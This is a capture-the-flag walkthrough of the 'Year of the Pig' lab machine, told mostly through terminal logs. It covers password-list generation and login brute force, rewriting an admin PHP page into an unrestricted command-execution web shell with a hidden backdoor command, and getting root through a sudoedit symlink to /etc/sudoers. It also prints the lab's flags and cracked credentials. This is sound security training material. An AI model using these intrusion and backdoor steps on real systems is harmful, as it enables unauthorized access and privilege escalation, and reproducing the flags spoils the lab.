----
Some pigs do fly...
----

![](https://i.imgur.com/JiwG6Si.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/dda3408fbc3312849968eadbfe72df74.jpeg)

### Task 1  Flags

 Start Machine

Some pigs fly, and some have stories to tell. Get going!

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.168.36 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.168.36:22
Open 10.10.168.36:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 19:38 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:38
Completed Parallel DNS resolution of 1 host. at 19:38, 0.12s elapsed
DNS resolution of 1 IPs took 0.15s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:38
Scanning 10.10.168.36 [2 ports]
Discovered open port 80/tcp on 10.10.168.36
Discovered open port 22/tcp on 10.10.168.36
Completed Connect Scan at 19:38, 0.20s elapsed (2 total ports)
Initiating Service scan at 19:38
Scanning 2 services on 10.10.168.36
Completed Service scan at 19:38, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.168.36.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 4.38s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.94s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.00s elapsed
Nmap scan report for 10.10.168.36
Host is up, received user-set (0.19s latency).
Scanned at 2023-06-28 19:38:37 EDT for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Marco's Blog
|_http-favicon: Unknown favicon MD5: 9899F13BCC614EE8275B88FFDC0D04DB
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.51 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.168.36/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.168.36/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/06/28 19:41:11 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.168.36/login.php            (Status: 200) [Size: 2790]
http://10.10.168.36/.php                 (Status: 403) [Size: 277]
http://10.10.168.36/admin                (Status: 301) [Size: 312] [--> http://10.10.168.36/admin/]
http://10.10.168.36/assets               (Status: 301) [Size: 313] [--> http://10.10.168.36/assets/]
http://10.10.168.36/css                  (Status: 301) [Size: 310] [--> http://10.10.168.36/css/]
http://10.10.168.36/js                   (Status: 301) [Size: 309] [--> http://10.10.168.36/js/]
http://10.10.168.36/api                  (Status: 301) [Size: 310] [--> http://10.10.168.36/api/]

marco:marco

http://10.10.168.36/login.php

Remember that passwords should be a memorable word, followed by two numbers and a special character

┌──(witty㉿kali)-[~/Downloads]
└─$ cat generateList.py 
memorableWords = ['Italy', 'italy', 'Milan', 'milan', 'Savoia', 'savoia',
                  'Curtiss', 'curtiss', 'Curtis', 'curtis', 'planes', 'Planes',
                  'Plane', 'plane']
specialChars = ['!','@','#','$']
count = 0

for word in memorableWords:
    for specialChar in specialChars:
        while (count <= 99):
            if (count <= 9):
                count = '0' + str(count)
            else:
                count = str(count)
            print(word + count + specialChar)
            count = int(count)
            count += 1
        count = 0

┌──(witty㉿kali)-[~/Downloads]
└─$ python generateList.py > passwords_generated.lst
                                                                                                         
┌──(witty㉿kali)-[~/Downloads]
└─$ cat passwords_generated.lst 
Italy00!
Italy01!
Italy02!
Italy03!
Italy04!
Italy05!

┌──(witty㉿kali)-[~/Downloads]
└─$ while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' '; done < passwords_generated.lst | tee -a passwords_hashed.lst

┌──(witty㉿kali)-[~/Downloads]
└─$ head passwords_hashed.lst 
40bc3113109f8a7bceb98877ace7ffcc
fb8bb8e4fa357a5bf0f62a48ddf81377
0954309828d4a04cefd3afcde0f20ae0
ad1a07cea696edfea2be8ffbd378ef63
a56453f97de07b20f3037beb2ee469d4
bcf1d815b9b0c8b2894daaca103e9273
90dd86eb130099579eed7edacbb2799d
c3e95889290a9826b352860f7e8bb70f
62039f00bc2c3e67775d16b550d703bb
02d55ad46a7dd6d5b53a9256d54a92d6

using burp intruder

{"username":"marco","password":"§f5888d0bb58d611107e11f7cbc41c97a§"}

"username":"marco","password":"ea22b622ba9b3c41b22785dcb40211ac"

HTTP/1.1 200 OK

{"Response":"Success","Verbose":"Logged in successfully","auth":"484364e69546acf7a6736e7e172f69f5"}

ea22b622ba9b3c41b22785dcb40211ac 2022

savoia21! 2022

marco:savoia21!  login

Use this page to execute arbitrary commands on the system

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh marco@10.10.168.36
The authenticity of host '10.10.168.36 (10.10.168.36)' can't be established.
ED25519 key fingerprint is SHA256:NA6wxwks9yC9RRUsw12szoz+dTUjJXyA37m9dSsUCa8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.168.36' (ED25519) to the list of known hosts.
marco@10.10.168.36's password: 

	
	__   __                       __   _   _            ____  _       
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _ 
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_) | |/ _` |
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
	                                                            |___/ 


marco@year-of-the-pig:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
marco@year-of-the-pig:~$ ls
flag1.txt
marco@year-of-the-pig:~$ cat flag1.txt 
THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}
marco@year-of-the-pig:~$ ls -lah
total 24K
drwxr-xr-x 2 marco marco 4.0K Aug 22  2020 .
drwxr-xr-x 4 root  root  4.0K Aug 16  2020 ..
lrwxrwxrwx 1 root  root     9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 marco marco 3.7K Apr  4  2018 .bashrc
-r-------- 1 marco marco   38 Aug 22  2020 flag1.txt
-rw-r--r-- 1 marco marco  807 Apr  4  2018 .profile

-rw-r--r-- 1 marco marco  807 Apr  4  2018 .profile
marco@year-of-the-pig:~$ cd /var/www/html/admin
marco@year-of-the-pig:/var/www/html/admin$ ls
adduser.php   deleteuser.php      getUsers.php  index.php    prepareAuth.php    sessionCleanup.php
commands.php  getCurrentUser.php  includes.php  landing.php  resetpassword.php  style.css
marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
<?php
    require_once "/var/www/html/admin/prepareAuth.php";
    if (!$auth){
        header("location: /login.php");
    }
	$dbh->close();
?>

<!DOCTYPE html>
<html>
	<p id="id" style="display:none">commands</p>
	<?php require "includes.php";?>
	<body class="include">
		<h1 id="content-title">Commands</h1>
		<h2>Use this page to execute arbitrary commands on the system</h2>
		<form method=post style="display: inline;">
			<input type=text name="command" class="input" placeholder="Command...">
			<input style="display:none;" type=submit name="submit" value="Execute" class="input" id="submit">
		</form>
		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" onclick="javascript:document.querySelector('#submit').click()">
		<?php
			//Totally useless script to catch hackers out, eh, Marco? You old rogue!
			if (isset($_POST["command"])){
				echo "<pre>";
				$cmd=$_POST["command"];
				if (strlen($cmd) == 0){
					echo "No command entered";
				}
				else if ($cmd == "whoami"){
					echo "www-data";
				}
				else if ($cmd == "id"){
					echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
				}
				else if ($cmd == "ifconfig"){
					system("ifconfig");
				}
				else if (substr($cmd,0,5) == "echo "){
					echo substr($cmd,5);
				}
				else if ($cmd == "hostname"){
					echo "year-of-the-pig";
				}
				else if (stristr($cmd,"nc")){
					preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} +\d{1,5}/", $cmd, $string);
					$components = explode(" ", $string[0]);
					$ip = $components[0];
					$port = end(array_values($components));
					system("nc $ip $port >/dev/null 2>&1");
				}
				else{
					echo "Invalid Command!";
				}
				echo "<pre>\n";
			}
		?>
	</body>
</html>

replace

marco@year-of-the-pig:/var/www/html/admin$ cat commands.php 
<?php
    require_once "/var/www/html/admin/prepareAuth.php";
    if (!$auth){
        header("location: /login.php");
    }
	$dbh->close();
?>

<!DOCTYPE html>
<html>
	<p id="id" style="display:none">commands</p>
	<?php require "includes.php";?>
	<body class="include">
		<h1 id="content-title">Commands</h1>
		<h2>Use this page to execute arbitrary commands on the system</h2>
		<form method=post style="display: inline;">
			<input type=text name="command" class="input" placeholder="Command...">
			<input style="display:none;" type=submit name="submit" value="Execute" class="input" id="submit">
		</form>
		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" onclick="javascript:document.querySelector('#submit').click()">
		<?php
//Totally useless script to catch hackers out, eh, Marco? You old rogue!
if (isset($_POST["command"])){
    echo "<pre>";
    $cmd=$_POST["command"];
    if (strlen($cmd) == 0){
        echo "No command entered";
    }
    else if ($cmd == "whoami"){
        echo "www-data";
    }
    else if ($cmd == "id"){
        echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
    }
    else if ($cmd == "ifconfig"){
        system("ifconfig");
    }
    else if (substr($cmd,0,5) == "echo "){
        system($cmd);
    }
    else if ($cmd == "hostname"){
        echo "year-of-the-pig";
    }
    else{
        system($cmd);
    }
    echo "<pre>\n";
}
?>
	</body>
</html>



http://10.10.168.36/admin/
cat /var/www/admin.db

SQLite format 3@  nn.�
��0����r�7tablesessionssessionsCREATE TABLE sessions (
sessID TEXT UNIQUE PRIMARY KEY,
userID TEXT,
expiryTime TEXT)/Cindexsqlite_autoindex_sessions_1sessionsp�?tableusersusersCREATE TABLE users (
userID TEXT UNIQUE PRIMARY KEY,
username TEXT UNIQUE,
password TEXT))=indexsqlite_autoindex_users_2users)=indexsqlite_autoindex_users_1users
i�i��k�JJMMf64ccfff6f64d57b121a85f9385cf256curtisa80bfe309ecaafcea1ea6cb3677971f2IMM58a2f366b1fd51e127a47da03afc9995marcoea22b622ba9b3c41b22785dcb40211ac
����mm�J%$Mf64ccfff6f64d57b121a85f9385cf256#M	58a2f366b1fd51e127a47da03afc9995
�������	
curtis	marco
�`NMM!c404f6ecb1eb7f8d997e830ae7458b1658a2f366b1fd51e127a47da03afc99951688084057NMM!b0d0a65ab91e3c88aab21a9ed530c51858a2f366b1fd51e127a47da03afc99951688084048NMM!484364e69546acf7a6736e7e172f69f558a2f366b1fd51e127a47da03afc99951688083596

a80bfe309ecaafcea1ea6cb3677971f2


|Donald1983$|

or

else if($cmd == "givemethepass"){
	system("chmod a+r /var/www/admin.db")
	echo "no problem";
}

marco@year-of-the-pig:/var/www/html/admin$ tail -n20 commands.php 
        system("ifconfig");
    }
    else if (substr($cmd,0,5) == "echo "){
        system($cmd);
    }
    else if ($cmd == "hostname"){
        echo "year-of-the-pig";
    }
    else if($cmd == "givemethepass"){
	system("chmod a+r /var/www/admin.db");
	}else{
        system($cmd);
    }
    echo "<pre>\n";
}
?>
	</body>
</html>

marco@year-of-the-pig:/var/www$ sqlite3 admin.db
SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.
sqlite> .tables
sessions  users 
sqlite> select * from users;
58a2f366b1fd51e127a47da03afc9995|marco|ea22b622ba9b3c41b22785dcb40211ac
f64ccfff6f64d57b121a85f9385cf256|curtis|a80bfe309ecaafcea1ea6cb3677971f2
sqlite> .exit

marco@year-of-the-pig:/home/curtis$ su curtis
Password: 
curtis@year-of-the-pig:~$ cat flag2.txt 
THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}

curtis@year-of-the-pig:/var/www$ sudo -l
[sudo] password for curtis: 
Matching Defaults entries for curtis on year-of-the-pig:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH"

User curtis may run the following commands on year-of-the-pig:
    (ALL : ALL) sudoedit /var/www/html/*/*/config.php

curtis@year-of-the-pig:/var/www$ exit
exit
marco@year-of-the-pig:/var/www$ ln -s /etc/sudoers /var/www/html/assets/img/config.php

marco@year-of-the-pig:/var/www$ su curtis
Password: 
curtis@year-of-the-pig:/var/www$ cd /var/www/html/assets/img
curtis@year-of-the-pig:/var/www/html/assets/img$ ls -lah
total 188K
drwxrwxr-x 2 www-data web-developers 4.0K Jun 29 02:00 .
drwxrwxr-x 4 www-data web-developers 4.0K Aug 20  2020 ..
-rw-r--r-- 1 root     root            156 May 15  2020 arrow.png
lrwxrwxrwx 1 marco    marco            12 Jun 29 02:00 config.php -> /etc/sudoers
-rwxrwxr-x 1 www-data web-developers 105K Aug 17  2020 favicon.ico
-rwxrwxr-x 1 www-data web-developers  66K Aug 16  2020 plane.png
curtis@year-of-the-pig:/var/www/html/assets/img$ sudoedit /var/www/html/*/*/config.php

curtis ALL=(ALL) ALL
under the **User privilege specification** section.
curtis@year-of-the-pig:/var/www/html/assets/img$ sudo su
root@year-of-the-pig:/var/www/html/assets/img# cd /root
root@year-of-the-pig:~# ls
root.txt
root@year-of-the-pig:~# cat root.txt 
THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}


```

Flag 1  

Case matters. T-Minus 120s.

*THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}*

Flag 2  

*THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}*

Root Flag  

*THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}*


[[Year of the Dog]]